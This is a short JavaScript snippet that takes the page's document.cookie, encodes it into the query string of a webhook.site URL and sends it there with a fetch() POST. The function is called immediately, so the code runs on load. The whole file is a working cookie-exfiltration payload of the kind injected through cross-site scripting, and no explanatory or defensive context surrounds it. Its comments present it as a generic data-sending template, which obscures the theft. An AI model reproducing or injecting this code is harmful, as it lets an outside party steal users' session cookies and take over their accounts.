function sendDataToWebhook() {
    var cookieValue = encodeURIComponent(document.cookie);
  
    // Construct the URL with document.cookie as a parameter
    var webhookURL = 'https://webhook.site/0c4009df-31dd-4e36-a7b2-cf25eca8fd64/06550ece-043b-4744-8106-4e1dee84e946/1?cookie=' + cookieValue;
  
    // Replace 'your-data-here' with the actual data you want to send
    var dataToSend = 'your-data-here';
  
    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ data: dataToSend })
    })
    .then(response => response.json())
    .then(data => console.log('Data sent successfully:', data))
    .catch(error => console.error('Error sending data:', error));
  }
  
  // Call the function to send data
  sendDataToWebhook();
  